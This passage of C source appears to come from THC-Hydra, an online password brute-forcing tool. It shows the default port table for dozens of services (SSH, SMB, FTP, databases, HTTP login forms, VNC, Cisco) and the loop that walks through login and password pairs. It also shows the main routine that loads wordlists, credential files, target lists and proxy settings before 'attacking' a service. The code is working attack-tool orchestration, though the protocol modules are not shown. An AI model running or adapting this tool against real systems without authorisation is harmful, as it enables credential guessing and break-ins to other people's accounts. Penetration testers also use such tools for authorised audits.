        hydra_arms[arm_no]->active = 0;
        return -1;
      }
    }
  } else {
    perror("Error: socketpair creation failed");
    hydra_arms[arm_no]->sp[0] = -1;
    hydra_arms[arm_no]->active = 0;
    return -1;
  }
  return 0;
}

int
hydra_lookup_port(char *service)
{
  int i = 0;
  int port = -2;
  hydra_portlist hydra_portlists[] = {
    {"ftp", PORT_FTP, PORT_FTP_SSL},
    {"http-head", PORT_HTTP, PORT_HTTP_SSL},
    {"http-get", PORT_HTTP, PORT_HTTP_SSL},
    {"http-get-form", PORT_HTTP, PORT_HTTP_SSL},
    {"http-post-form", PORT_HTTP, PORT_HTTP_SSL},
    {"https-get-form", PORT_HTTP, PORT_HTTP_SSL},
    {"https-post-form", PORT_HTTP, PORT_HTTP_SSL},
    {"https-head", PORT_HTTP, PORT_HTTP_SSL},
    {"https-get", PORT_HTTP, PORT_HTTP_SSL},
    {"http-proxy", PORT_HTTP_PROXY, PORT_HTTP_PROXY_SSL},
    {"http-proxy-ntlm", PORT_HTTP_PROXY, PORT_HTTP_PROXY_SSL},
    {"icq", PORT_ICQ, PORT_ICQ_SSL},
    {"imap", PORT_IMAP, PORT_IMAP_SSL},
    {"imap-ntlm", PORT_IMAP, PORT_IMAP_SSL},
    {"ldap2", PORT_LDAP, PORT_LDAP_SSL},
    {"ldap3", PORT_LDAP, PORT_LDAP_SSL},
    {"oracle-listener", PORT_ORACLE, PORT_ORACLE_SSL},
    {"mssql", PORT_MSSQL, PORT_MSSQL_SSL},
    {"mysql", PORT_MYSQL, PORT_MYSQL_SSL},
    {"postgres", PORT_POSTGRES, PORT_POSTGRES_SSL},
    {"pcanywhere", PORT_PCANYWHERE, PORT_PCANYWHERE_SSL},
    {"nntp", PORT_NNTP, PORT_NNTP_SSL},
    {"pcnfs", PORT_PCNFS, PORT_PCNFS_SSL},
    {"pop3", PORT_POP3, PORT_POP3_SSL},
    {"pop3-ntlm", PORT_POP3, PORT_POP3_SSL},
    {"rexec", PORT_REXEC, PORT_REXEC_SSL},
    {"rlogin", PORT_RLOGIN, PORT_RLOGIN_SSL},
    {"rsh", PORT_RSH, PORT_RSH_SSL},
    {"sapr3", PORT_SAPR3, PORT_SAPR3_SSL},
    {"smb", PORT_SMB, PORT_SMB_SSL},
    {"smbnt", PORT_SMBNT, PORT_SMBNT_SSL},
    {"socks5", PORT_SOCKS5, PORT_SOCKS5_SSL},
    {"ssh2", PORT_SSH, PORT_SSH_SSL},
    {"telnet", PORT_TELNET, PORT_TELNET_SSL},
    {"cisco", PORT_TELNET, PORT_TELNET_SSL},
    {"cisco-enable", PORT_TELNET, PORT_TELNET_SSL},
    {"vnc", PORT_VNC, PORT_VNC_SSL},
    {"snmp", PORT_SNMP, PORT_SNMP_SSL},
    {"cvs", PORT_CVS, PORT_CVS_SSL},
    {"svn", PORT_SVN, PORT_SVN_SSL},
    {"smtp-auth", PORT_SMTPAUTH, PORT_SMTPAUTH_SSL},
    {"smtp-auth-ntlm", PORT_SMTPAUTH, PORT_SMTPAUTH_SSL},
    {"teamspeak", PORT_TEAMSPEAK, PORT_TEAMSPEAK_SSL},
    {"sip", PORT_SIP, PORT_SIP_SSL},
    {"vmauthd", PORT_VMAUTHD, PORT_VMAUTHD_SSL},
    {"", PORT_NOPORT, PORT_NOPORT}
  };
/* ADD NEW SERVICES HERE - add new port numbers to hydra.h */

  while (strlen(hydra_portlists[i].name) > 0 && port == -2) {
    if (strcmp(service, hydra_portlists[i].name) == 0) {
      if (hydra_options.ssl)
        port = hydra_portlists[i].port_ssl;
      else
        port = hydra_portlists[i].port;
    }
    i++;
  }
  if (port < 1)
    return -1;
  else
    return port;
}

void
hydra_kill_arm(int arm_no, int killit, int fail)
{
  if (killit && hydra_arms[arm_no]->pid > 0)
    kill(hydra_arms[arm_no]->pid, SIGTERM);
  hydra_targets[hydra_arms[arm_no]->target_no]->use_count--;
  if(hydra_arms[arm_no]->active)	{
     close(hydra_arms[arm_no]->sp[0]);
     close(hydra_arms[arm_no]->sp[1]);
  }
  hydra_arms[arm_no]->active = 0;
  if (fail) {
    hydra_arms[arm_no]->redo = 1;

/* FIXME - I think it is okay to not enable this routine as the server connect failure counter is taking care of everything
    hydra_arms[arm_no]->fail_count++;
    if (hydra_arms[arm_no]->fail_count++ >= MAXFAIL) {
      hydra_arms[arm_no]->active = -1;
      printf("[VERBOSE] disabled child %d\n", arm_no);
    }
*/
  }
  if (hydra_arms[arm_no]->pid > 0 && killit)
    kill(hydra_arms[arm_no]->pid, SIGKILL);
  hydra_arms[arm_no]->pid = -1;
  (void) wait3(NULL, WNOHANG, NULL);
}

/* returns 0 if a valid next pair is found or end of list, 1 if double is detected, -1 if no password is available */
int
hydra_next_pair(int target_no)
{
  if (hydra_targets[target_no]->done == 1)
    return -1;
  if (hydra_targets[target_no]->pass_state < hydra_options.try_null_password + hydra_options.try_password_same_as_login)
    return -1;
  if (debug)
    printf("[DEBUG] pass_state: %d  login_no: %lu  pass_no: %lu (countlogin: %lu  countpass:%lu)\n", hydra_targets[target_no]->pass_state, (unsigned long int) hydra_targets[target_no]->login_no, (unsigned long int) hydra_targets[target_no]->pass_no, (unsigned long int) hydra_brains.countlogin, (unsigned long int) hydra_brains.countpass);

  hydra_targets[target_no]->pass_no++;
  if (hydra_targets[target_no]->pass_no >= hydra_brains.countpass) {    /* end of password list */
    hydra_targets[target_no]->login_no++;
    hydra_targets[target_no]->pass_no = 0;
    hydra_targets[target_no]->pass_state = 0;
    if (hydra_targets[target_no]->login_no >= hydra_brains.countlogin) {        /* end of login list -> finished! */
      if (hydra_targets[target_no]->done == 0) {
        hydra_targets[target_no]->done = 1;
        hydra_brains.finished++;
        printf("[STATUS] attack finished for %s (waiting for childs to finish)\n", hydra_targets[target_no]->target);
      }
    } else {                       /* next login, reset password pointer */
      if (hydra_options.colonfile == NULL) {    /* standard -lL/-pP mode */hydra_targets[target_no]->login_ptr++;
        while (*hydra_targets[target_no]->login_ptr != 0)
          hydra_targets[target_no]->login_ptr++;
        hydra_targets[target_no]->login_ptr++;
        hydra_targets[target_no]->pass_ptr = pass_ptr;
      } else {                  /* colonfile mode */
        hydra_targets[target_no]->login_ptr = hydra_targets[target_no]->pass_ptr;
        hydra_targets[target_no]->login_ptr++;
        while (*hydra_targets[target_no]->login_ptr != 0)
          hydra_targets[target_no]->login_ptr++;
        hydra_targets[target_no]->login_ptr++;
        hydra_targets[target_no]->pass_ptr = hydra_targets[target_no]->login_ptr;
        hydra_targets[target_no]->pass_ptr++;
        while (*hydra_targets[target_no]->pass_ptr != 0)
          hydra_targets[target_no]->pass_ptr++;
        hydra_targets[target_no]->pass_ptr++;
      }
    }
  } else {                      /* next password */
  hydra_targets[target_no]->pass_ptr++;
    while (*hydra_targets[target_no]->pass_ptr != 0)
      hydra_targets[target_no]->pass_ptr++;
    hydra_targets[target_no]->pass_ptr++;
  }
  /* check for doubles if special modes are used */
  if (hydra_targets[target_no]->pass_state > 0) {
    if (hydra_options.try_null_password && strlen(hydra_targets[target_no]->pass_ptr) == 0)
      return 1;
    if (hydra_options.try_password_same_as_login && strcmp(hydra_targets[target_no]->pass_ptr, hydra_targets[target_no]->login_ptr) == 0)
      return 1;
  }
  return 0;
}

#ifdef NESSUS_PLUGIN
int
hydra_main(int soc, struct arglist *nessus, int argc, char *argv[])
{
#else
int
hydra_main(int soc, void *nessus, int argc, char *argv[])
{
#endif
  /* other vars */
  char *proxy_string = NULL;
  FILE *lfp = NULL, *pfp = NULL, *cfp = NULL, *ifp = NULL;
  size_t countinfile = 1, sizeinfile = 0;
  unsigned long int math2;
  struct hostent *target;
  struct in_addr in;
  int i = 0, j = 0, error = 0, recheck = 0, buflen;
  int arm_no = 0, target_no = 0;
  time_t starttime, elapsed_status, elapsed_restore, status_print = 59, tmp_time;
  char *tmpptr;
  char rc, buf[MAXBUF];
  fd_set fdreadarms;
  int max_fd;
  

#ifdef NESSUS_PLUGIN
  char *svc_kb_name;
  char *asc_port;
#endif

  /* set defaults */
  memset(&hydra_options, 0, sizeof(hydra_options));
  memset(&hydra_brains, 0, sizeof(hydra_brains));
  prg = argv[0];
  hydra_options.debug = debug = 0;
  hydra_options.verbose = verbose = 0;
  found = 0;
  use_proxy = 0;
  proxy_string_ip = proxy_string_port = 0;
  proxy_authentication = cmdlinetarget = NULL;
  hydra_options.waittime = waittime = WAITTIME;
  hydra_options.tasks = TASKS;
  hydra_options.login = NULL;
  hydra_options.loginfile = NULL;
  hydra_options.pass = NULL;
  hydra_options.passfile = NULL;
  hydra_options.max_use = MAXTASKS;
  hydra_brains.ofp = stdout;
  hydra_brains.targets = 1;
  (void) setvbuf(stdout, NULL, _IONBF, 0);
  (void) setvbuf(stderr, NULL, _IONBF, 0);
  /* command line processing */
  if (argc < 4 && (argc < 2 || strcmp(argv[1], "-R") != 0))
    help();
  while ((i = getopt(argc, argv, "Rde:vVl:fg:L:p:P:o:M:C:t:T:m:w:s:S")) >= 0) {
    switch (i) {
    case 'R':
      hydra_options.restore = 1;
      if (argc != 2)
        bail("no option may be supplied together with -R");
      break;
    case 'd':
      hydra_options.debug = debug = 1;
      ++verbose;
      break;
    case 'e':
      i = 0;
      while (i < strlen(optarg)) {
        switch (optarg[i]) {
        case 'n':
          hydra_options.try_null_password = 1;
          hydra_options.mode = hydra_options.mode | 16;
          break;
        case 's':
          hydra_options.try_password_same_as_login = 1;
          hydra_options.mode = hydra_options.mode | 32;
          break;
        default:
          fprintf(stderr, "Error: unknown mode %c for option -e, only supporting \"n\" and \"s\"\n", optarg[i]);
          exit(-1);
        }
        i++;
      }
      break;
    case 'v':
      hydra_options.verbose = verbose = 1;
      break;
    case 'V':
      hydra_options.showAttempt = 1;
      break;
    case 'l':
      hydra_options.login = optarg;
      break;
    case 'L':
      hydra_options.loginfile = optarg;
      hydra_options.mode = hydra_options.mode | 2;
      break;
    case 'p':
      hydra_options.pass = optarg;
      break;
    case 'P':
      hydra_options.passfile = optarg;
      hydra_options.mode = hydra_options.mode | 1;
      break;
    case 'f':
      hydra_options.exit_found = 1;
      break;
    case 'o':
      hydra_options.outfile_ptr = optarg;
      break;
    case 'M':
      hydra_options.infile_ptr = optarg;
      break;
    case 'C':
      hydra_options.colonfile = optarg;
      hydra_options.mode = 64;
      break;
    case 't':
      hydra_options.tasks = atoi(optarg);
      break;
    case 'm':
      hydra_options.miscptr = optarg;
      break;
    case 'w':
      hydra_options.waittime = waittime = atoi(optarg);
      break;
    case 's':
      hydra_options.port = port = atoi(optarg);
      break;
    case 'S':
#ifndef LIBOPENSSL
      fprintf(stderr, "Sorry, hydra was compiled without SSL support. Install openssl and recompile! Option ignored...\n");
      hydra_options.ssl = 0;
      break;
#else
      hydra_options.ssl = 1;
      break;
#endif
    case 'g':
      fprintf(stderr, "Warning: option -g is deprected, ignored.\n");
      break;
    case 'T':
      hydra_options.max_use = atoi(optarg);
      break;
    default:
      fprintf(stderr, "Error: unknown option -%c\n", i);
      help();
    }
  }
  if (hydra_options.restore) {
    hydra_restore_read();
    /* stuff we had to copy from the non-restore part */
    if (strncmp(hydra_options.service, "http-", 5) == 0) {
      if (getenv("HYDRA_PROXY_HTTP") && getenv("HYDRA_PROXY_CONNECT"))
        bail("Found HYDRA_PROXY_HTTP *and* HYDRA_PROXY_CONNECT environment variables - you can use only ONE for the service http-head/http-get!");
      if (getenv("HYDRA_PROXY_HTTP")) {
        printf("[INFO] Using HTTP Proxy: %s\n", getenv("HYDRA_PROXY_HTTP"));
        use_proxy = 1;
      }
    }
  } else {                      /* normal mode, aka non-restore mode */
    if (hydra_options.infile_ptr != NULL) {
      if (optind + 2 < argc)
        bail("The -M FILE option can not be used together with a host on the commandline");
      if (optind + 1 > argc)
        bail("You need to define a service to attack");
      if (optind + 2 == argc)
        fprintf(stderr, "Warning: With the -M FILE option you can not specify a server on the commandline. Lets hope you did everything right!\n");
      hydra_options.server = NULL;
      hydra_options.service = argv[optind];
      if (optind + 2 == argc)
        hydra_options.miscptr = argv[optind + 1];
    } else if (optind + 2 != argc && optind + 3 != argc) {
      hydra_options.server = NULL;
      hydra_options.service = NULL;
      help();
    } else {
      hydra_options.server = argv[optind];
      cmdlinetarget = argv[optind];
      hydra_options.service = argv[optind + 1];
      if (optind + 3 == argc)
        hydra_options.miscptr = argv[optind + 2];
    }

    if (strcmp(hydra_options.service, "ssl") == 0 || strcmp(hydra_options.service, "www") == 0 || strcmp(hydra_options.service, "http") == 0 || strcmp(hydra_options.service, "https") == 0) {
      fprintf(stderr, "Error: The service http has been replaced with http-head and http-get. Same for https.\n");
      exit(-1);
    }

    i = 0;
    if (strcmp(hydra_options.service, "telnet") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "ftp") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "pop3") == 0 || strcmp(hydra_options.service, "pop3-ntlm") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "imap") == 0 ||strcmp(hydra_options.service, "imap-ntlm") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "vmauthd") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "rexec") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "rlogin") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "rsh") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "nntp") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "socks5") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "icq") == 0) {
      fprintf(stderr, "[WARNING] The icq module is not working with the modern protocol version! (somebody else will need to fix this as I dont care for icq)\n");
      i = 1;
    }
    if (strcmp(hydra_options.service, "mysql") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "mssql") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "oracle-listener") == 0) {
      i = 2;
      hydra_options.login = empty_login;
    }
    if (strcmp(hydra_options.service, "postgres") == 0)
#ifdef LIBPOSTGRES
      i = 1;
#else
      bail("Compiled without LIBPOSTGRES support, module not available!");
#endif
    if (strcmp(hydra_options.service, "pcanywhere") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "http-proxy") == 0 || strcmp(hydra_options.service, "http-proxy-ntlm") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "cvs") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "svn") == 0)
      i = 1;
    if (strcmp(hydra_options.service, "ssh2") == 0)
#ifdef LIBSSH
      i = 1;
#else
      bail("Compiled without LIBSSH support, module not available!");
#endif
     if (strcmp(hydra_options.service, "smtp-auth") == 0 || strcmp(hydra_options.service, "smtp-auth-ntlm") == 0)
        i = 1;
     if (strcmp(hydra_options.service, "teamspeak") == 0)
        i = 1;
/* ADD NEW SERVICES HERE */
    if (strcmp(hydra_options.service, "smb") == 0) {
      if (hydra_options.tasks > 1) {
        fprintf(stderr, "[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\n");
        hydra_options.tasks = 1;
        hydra_options.max_use = 1;
      }
      i = 1;
    }
    if (strcmp(hydra_options.service, "smbnt") == 0) {
#ifdef LIBOPENSSL
      if (hydra_options.tasks > 1) {
        fprintf(stderr, "[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\n");
        hydra_options.tasks = 1;
        hydra_options.max_use = 1;
      }
      i = 1;
#else
      bail("Compiled without OPENSSL support, module not available!");
#endif
    }
    if (strcmp(hydra_options.service, "pcnfs") == 0) {
      i = 1;
      if (port == 0)
        bail("You must set the port for pcnfs with -s (run \"rpcinfo -p %s\" and look for the pcnfs v2 UDP port)");
    }
    if (strcmp(hydra_options.service, "sapr3") == 0) {
#ifdef LIBSAPR3
      i = 1;
      if (port == PORT_SAPR3)
        bail("You must set the port for sapr3 with -s <port>, it should lie between 3200 and 3699.");
      if (port < 3200 || port > 3699)
        fprintf(stderr, "[WARNING] The port is not in the range 3200 to 3399 - please ensure it is ok!\n");
      if (hydra_options.miscptr == NULL || atoi(hydra_options.miscptr) < 0 || atoi(hydra_options.miscptr) > 999 || !isdigit(hydra_options.miscptr[0]))
        bail("You must set the client ID (0-999) as an additional option or via -m");
#else
      bail("Compiled without LIBSAPR3 support, module not available!");
#endif
    }
    if (strcmp(hydra_options.service, "cisco") == 0) {
      i = 2;
      hydra_options.login = empty_login;
      if (hydra_options.tasks > 4)
        printf("Warning: you should set the number of parallel task to 4 for cisco services.\n");
    }
    if (strcmp(hydra_options.service, "snmp") == 0) {
      i = 2;
      hydra_options.login = empty_login;
    }
        if (strcmp(hydra_options.service, "sip") == 0) {
            if(hydra_options.miscptr == NULL) {
                if(hydra_options.server != NULL) {
                    hydra_options.miscptr = hydra_options.server;
                    i=1;
                } else {
                    bail("The sip module does not work with multiple servers (-M)\n");
                }
            } else {
                i = 1;
            }
        }
    if (strcmp(hydra_options.service, "ldap") == 0) {
      bail("Please select ldap2 or ldap3 as protocol\n");
    }
    if (strcmp(hydra_options.service, "ldap2") == 0 || strcmp(hydra_options.service, "ldap3") == 0) {
      i = 1;
      if ((hydra_options.miscptr != NULL && hydra_options.login != NULL)
          || (hydra_options.miscptr != NULL && hydra_options.loginfile != NULL) || (hydra_options.login != NULL && hydra_options.loginfile != NULL))
        bail("you may only use one of -l, -L or -m (or none)\n");
      if (hydra_options.login == NULL && hydra_options.loginfile == NULL && hydra_options.miscptr == NULL)
        fprintf(stderr, "Warning: no DN to authenticate to defined, using DN of null (use -m, -l or -L to define DNs)\n");
      if (hydra_options.login == NULL && hydra_options.loginfile == NULL) {
        i = 2;
        hydra_options.login = empty_login;
      }
    }
    if (strcmp(hydra_options.service, "cisco-enable") == 0) {
      i = 3;
      if (hydra_options.login == NULL)
        hydra_options.login = empty_login;
      if (hydra_options.miscptr == NULL) {
        fprintf(stderr, "Warning: You did not supply the initial support to the Cisco via -l, assuming direct console access\n");
      }
      if (hydra_options.tasks > 4)
        printf("Warning: you should set the number of parallel task to 4 for cisco enable services.\n");
    }
    if (strcmp(hydra_options.service, "vnc") == 0) {
      i = 2;
      hydra_options.login = empty_login;
      if (hydra_options.tasks > 4)
        printf("Warning: you should set the number of parallel task to 4 for vnc services.\n");
    }
    if (strcmp(hydra_options.service, "https-head") == 0 || strcmp(hydra_options.service, "https-get") == 0) {
#ifdef LIBOPENSSL
      i = 1;
      hydra_options.ssl = 1;
      if (strcmp(hydra_options.service, "https-head") == 0)
        strcpy(hydra_options.service, "http-head");
      else
        strcpy(hydra_options.service, "http-get");
#else
      bail("Compiled without SSL support, module not available");
#endif
    }
    if (strcmp(hydra_options.service, "http-get") == 0 || strcmp(hydra_options.service, "http-head") == 0) {
      i = 1;
      if (hydra_options.miscptr == NULL)
        bail("You must supply the web page as an additional option or via -m");
      if (*hydra_options.miscptr != '/' && strstr(hydra_options.miscptr, "://") == NULL)
        bail("The web page you supplied must start with a \"/\", \"http://\" or \"https://\", e.g. \"/protected/login\"");
      if (getenv("HYDRA_PROXY_HTTP") && getenv("HYDRA_PROXY_CONNECT"))
        bail("Found HYDRA_PROXY_HTTP *and* HYDRA_PROXY_CONNECT environment variables - you can use only ONE for the service http-head/http-get!");
      if (getenv("HYDRA_PROXY_HTTP")) {
        printf("[INFO] Using HTTP Proxy: %s\n", getenv("HYDRA_PROXY_HTTP"));
        use_proxy = 1;
      }
    }

    if (strcmp(hydra_options.service, "http-get-form") == 0 || strcmp(hydra_options.service, "http-post-form") == 0) {
      i = 1;
      if (hydra_options.miscptr == NULL)
        bail("You must supply the web page as an additional option or via -m");
      //if (*hydra_options.miscptr != '/' && strstr(hydra_options.miscptr, "://") == NULL)
      //  bail("The web page you supplied must start with a \"/\", \"http://\" or \"https://\", e.g. \"/protected/login\"");
      if (getenv("HYDRA_PROXY_HTTP") && getenv("HYDRA_PROXY_CONNECT"))
        bail("Found HYDRA_PROXY_HTTP *and* HYDRA_PROXY_CONNECT environment variables - you can use only ONE for the service http-head/http-get!");
      if (getenv("HYDRA_PROXY_HTTP")) {
        printf("[INFO] Using HTTP Proxy: %s\n", getenv("HYDRA_PROXY_HTTP"));
        use_proxy = 1;
      }
    }

    if (strcmp(hydra_options.service, "https-get-form") == 0 || strcmp(hydra_options.service, "https-post-form") == 0) {
#ifdef LIBOPENSSL
      i = 1;
      hydra_options.ssl = 1;
      if (strcmp(hydra_options.service, "https-post-form") == 0)
        strcpy(hydra_options.service, "http-post-form");
      else
        strcpy(hydra_options.service, "http-get-form");
#else
      bail("Compiled without SSL support, module not available");
#endif
    }

    /* ADD NEW SERVICES HERE - if not above already */

    if (i == 0)
      bail("Unknown service");
    if (strcmp(hydra_options.service, "http-get") != 0 && strcmp(hydra_options.service, "http-head") != 0 && getenv("HYDRA_PROXY_HTTP"))
      fprintf(stderr, "Warning: the HYDRA_PROXY_HTTP environment variable works only with the http-head/http-get module, ignored...\n");
    if (i == 2 && ((hydra_options.login != NULL && strlen(hydra_options.login) > 0) || hydra_options.loginfile != NULL || hydra_options.colonfile != NULL))
      bail
        ("The cisco, oracle-listener, snmp and vnc crack modes are only using the -p or -P option, not login (-l, -L) or colon file (-C).\nUse the normal telnet crack mode for cisco using \"Username:\" authentication.\n");
    if (i == 1 && hydra_options.login == NULL && hydra_options.loginfile == NULL && hydra_options.colonfile == NULL)
      bail("I need at least either the -l, -L or -C option to know the login");
    if (hydra_options.colonfile != NULL && ((hydra_options.login != NULL || hydra_options.loginfile != NULL)
                                            || (hydra_options.pass != NULL && hydra_options.passfile != NULL)))
      bail("The -C option is standalone, dont use it with -l/L and -p/P !");
    if (hydra_options.try_password_same_as_login == 0 && hydra_options.try_null_password == 0 && hydra_options.pass == NULL && hydra_options.passfile == NULL
        && hydra_options.colonfile == NULL)
      bail("I need at least the -e, -p or -P option to have some passwords!");
    if (hydra_options.tasks < 1 || hydra_options.tasks > MAXTASKS) {
      fprintf(stderr, "Option -t needs to be a number between 1 and %d\n", MAXTASKS);
      exit(-1);
    }

    if (hydra_options.colonfile == NULL) {
      if (hydra_options.loginfile != NULL) {
        if ((lfp = fopen(hydra_options.loginfile, "r")) == NULL)
          bail("File for logins not found!");
        hydra_brains.countlogin = countlines(lfp, 0);
        hydra_brains.sizelogin = size_of_data;
        if (hydra_brains.countlogin == 0)
          bail("File for logins is empty!");
        login_ptr = malloc(hydra_brains.sizelogin);
        if (login_ptr == NULL)
          bail("Could not allocate enough memory for login file data");
        fill_mem(login_ptr, lfp, 0);
      } else {
        login_ptr = hydra_options.login;
        hydra_brains.sizelogin = strlen(hydra_options.login) + 1;
        hydra_brains.countlogin = 1;
      }
      if (hydra_options.passfile != NULL) {
        if ((pfp = fopen(hydra_options.passfile, "r")) == NULL)
          bail("File for passwords not found!");
        hydra_brains.countpass = countlines(pfp, 0);
        hydra_brains.sizepass = size_of_data;
        if (hydra_brains.countpass == 0)
          bail("File for passwords is empty!");
        pass_ptr = malloc(hydra_brains.sizepass);
        if (pass_ptr == NULL)
          bail("Could not allocate enough memory for password file data");
        fill_mem(pass_ptr, pfp, 0);
      } else {
        if (hydra_options.pass != NULL) {
          pass_ptr = hydra_options.pass;
          hydra_brains.countpass = 1;
          hydra_brains.sizepass = strlen(hydra_options.pass) + 1;
        } else {
          pass_ptr = hydra_options.pass = empty_login;
          hydra_brains.countpass = 0;
          hydra_brains.sizepass = 1;
        }
      }
    } else {
      if ((cfp = fopen(hydra_options.colonfile, "r")) == NULL)
        bail("File with login:password information not found!");
      hydra_brains.countlogin = countlines(cfp, 1);
      hydra_brains.sizelogin = size_of_data;
      if (hydra_brains.countlogin == 0)
        bail("File for login:password information is empty!");
      csv_ptr = malloc(hydra_brains.sizelogin + hydra_brains.countlogin + 8);
      if (csv_ptr == NULL)
        bail("Could not allocate enough memory for colon file data");
      fill_mem(csv_ptr, cfp, 1);
      hydra_brains.countpass = 1;
      pass_ptr = login_ptr = csv_ptr;
      while (*pass_ptr != 0)
        pass_ptr++;
      pass_ptr++;
    }

    hydra_brains.countpass += hydra_options.try_password_same_as_login + hydra_options.try_null_password;
    if (fopen(RESTOREFILE, "r") != NULL) {
      fprintf(stderr, "WARNING: Restorefile (%s) from a previous session found, to prevent overwriting, you have 10 seconds to abort...\n", RESTOREFILE);
      sleep(10);
    }

    if (hydra_options.infile_ptr != NULL) {
      if ((ifp = fopen(hydra_options.infile_ptr, "r")) == NULL)
        bail("File for IP addresses not found!");
      hydra_brains.targets = countservers = countinfile = countlines(ifp, 0);
      if (countinfile == 0)
        bail("File for IP addresses is empty!");
      hydra_targets = malloc(sizeof(hydra_targets) * countservers);
      if (hydra_targets == NULL)
        bail("Could not allocate enough memory for target data");
      sizeinfile = size_of_data;
      servers_ptr = malloc(sizeinfile);
      if (servers_ptr == NULL)
        bail("Could not allocate enough memory for target file data");
      fill_mem(servers_ptr, ifp, 0);
      sizeservers = sizeinfile;
      tmpptr = servers_ptr;
      for (i = 0; i < countinfile; i++) {
        hydra_targets[i] = malloc(sizeof(hydra_target));
        memset(hydra_targets[i], 0, sizeof(hydra_target));
        hydra_targets[i]->target = tmpptr;
        while (*tmpptr != 0)
          tmpptr++;
        tmpptr++;
        hydra_targets[i]->login_ptr = login_ptr;
        hydra_targets[i]->pass_ptr = pass_ptr;
        hydra_targets[i]->max_use_count = hydra_options.max_use;
      }
    } else {
      countservers = hydra_brains.targets = 1;
      hydra_targets = malloc(sizeof(hydra_targets));
      hydra_targets[0] = malloc(sizeof(hydra_target));
      memset(hydra_targets[0], 0, sizeof(hydra_target));
      hydra_targets[0]->target = servers_ptr = hydra_options.server;
      sizeservers = strlen(hydra_options.server) + 1;
      hydra_targets[0]->login_ptr = login_ptr;
      hydra_targets[0]->pass_ptr = pass_ptr;
      hydra_targets[0]->max_use_count = hydra_options.max_use;
    }
  }                             /* END OF restore == 0 */

  if (getenv("HYDRA_PROXY_CONNECT") && use_proxy == 0) {
    printf("[INFO] Using Connect Proxy: %s\n", getenv("HYDRA_PROXY_CONNECT"));
    use_proxy = 2;
  }
  if (use_proxy == 1)
    proxy_string = getenv("HYDRA_PROXY_HTTP");
  if (use_proxy == 2)
    proxy_string = getenv("HYDRA_PROXY_CONNECT");
  if (proxy_string != NULL && proxy_string[0] != 0) {
    if (strstr(proxy_string, "//") != NULL) {
      proxy_string = strstr(proxy_string, "//");
      proxy_string += 2;
    }
    if (proxy_string[strlen(proxy_string) - 1] == '/')
      proxy_string[strlen(proxy_string) - 1] = 0;
    if ((tmpptr = index(proxy_string, ':')) == NULL)
      use_proxy = 0;
    else {
      *tmpptr = 0;
      tmpptr++;
#ifdef CYGWIN
      if (inet_aton(proxy_string, &in) <= 0) {
#else
      if (inet_pton(AF_INET, proxy_string, &in) <= 0) {
#endif
        if ((target = gethostbyname(proxy_string)) != NULL)
          memcpy(&proxy_string_ip, target->h_addr, 4);
        else
          use_proxy = 0;
      } else {
        memcpy(&proxy_string_ip, &in.s_addr, 4);
      }
      proxy_string_port = atoi(tmpptr);
    }
    if (use_proxy == 0)
      fprintf(stderr, "Warning: invalid proxy definition. Syntax: \"http://1.2.3.4:80/\".\n");
  } else
    use_proxy = 0;
  if (use_proxy > 0 && (tmpptr = getenv("HYDRA_PROXY_AUTH")) != NULL && tmpptr[0] != 0) {
    if (index(tmpptr, ':') == NULL) {
      fprintf(stderr, "Warning: invalid proxy authentication. Syntax: \"login:password\". Ignoring ...\n");
    } else {
      proxy_authentication = malloc(strlen(tmpptr) * 2 + 50);
      strcpy(proxy_authentication, tmpptr);
      hydra_tobase64((unsigned char *) proxy_authentication, strlen(proxy_authentication), strlen(tmpptr) * 2 + 8);
//      free(proxy_authentication);
//      proxy_authentication = NULL;
    }
  }

  if (hydra_options.restore == 0) {
    math2 = hydra_brains.countlogin * hydra_brains.countpass;
    hydra_brains.todo = math2;
    math2 = math2 * hydra_brains.targets;
    hydra_brains.todo_all = math2;
    if (hydra_brains.todo_all == 0)
      bail("No login/password combination given!");
    if (hydra_brains.todo_all < hydra_options.tasks) {
      hydra_options.tasks = math2;
      if (verbose)
        fprintf(stderr, "[VERBOSE] More tasks defined than login/pass pairs exist. Tasks reduced to %d.\n", hydra_options.tasks);
    }
  }
  if (hydra_options.tasks > hydra_brains.targets * hydra_options.max_use) {
    hydra_options.tasks = hydra_brains.targets * hydra_options.max_use;
    fprintf(stderr, "Warning: More tasks defined than allowed per maximal connections per server. Tasks reduced to %d.\n", hydra_options.tasks);
  }
  math2 = hydra_brains.todo_all / hydra_options.tasks;
  /* set options (bits!) */
  options = 0;
  if (hydra_options.ssl)
    options = options | OPTION_SSL;
  printf("%s %s (c) 2006 by %s - use allowed only for legal purposes.\n", PROGRAM, VERSION, AUTHOR);
  printf("%s (%s) starting at %s\n", PROGRAM, RESSOURCE, hydra_build_time());
  if (hydra_options.colonfile != NULL)
    printf("[DATA] %d tasks, %d servers, %lu login tries, ~%lu tries per task\n", hydra_options.tasks, hydra_brains.targets, hydra_brains.todo, math2);
  else
    printf("[DATA] %d tasks, %d servers, %lu login tries (l:%lu/p:%lu), ~%lu tries per task\n", hydra_options.tasks, hydra_brains.targets, hydra_brains.todo,
           (unsigned long int) hydra_brains.countlogin, (unsigned long int) hydra_brains.countpass, math2);
  if (port < 1)
    if ((port = hydra_lookup_port(hydra_options.service)) < 1) {
      fprintf(stderr, "Error: No valid port set or no default port available. Use the -s Option\n");
      exit(-1);
    }

  printf("[DATA] attacking service %s on port %d\n", hydra_options.service, port);

  if (hydra_options.outfile_ptr != NULL) {
    if ((hydra_brains.ofp = fopen(hydra_options.outfile_ptr, "a+")) == NULL) {
      perror("Error: Error creating outputfile:");
      exit(-1);
    }
    fprintf(hydra_brains.ofp, "# %s %s run at %s on %s %s (%s ", PROGRAM, VERSION, hydra_build_time(), hydra_options.server, hydra_options.service, prg);
    if (hydra_options.login != NULL)
      fprintf(hydra_brains.ofp, "-l %s ", hydra_options.login);
